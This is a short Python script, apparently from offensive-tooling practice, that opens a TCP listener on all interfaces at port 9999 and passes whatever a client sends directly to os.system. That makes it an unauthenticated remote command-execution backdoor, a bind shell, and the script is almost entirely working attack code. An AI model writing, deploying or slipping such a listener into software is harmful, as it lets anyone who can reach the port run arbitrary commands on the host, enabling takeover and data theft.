from http import server
import socket
import threading
import os

bind_ip = "0.0.0.0"
bind_port = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))

server.listen(5)

print(f"[*] Listening on {bind_ip}:{bind_port}")

def handle_client(client_socket):
    request = client_socket.recv(1024)
    os.system(request.decode('utf-8'))
    print(f"[*] Received {request}")

    client_socket.send(b"ACK!")
    client_socket.close()


while True:
    client, addr = server.accept()

    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()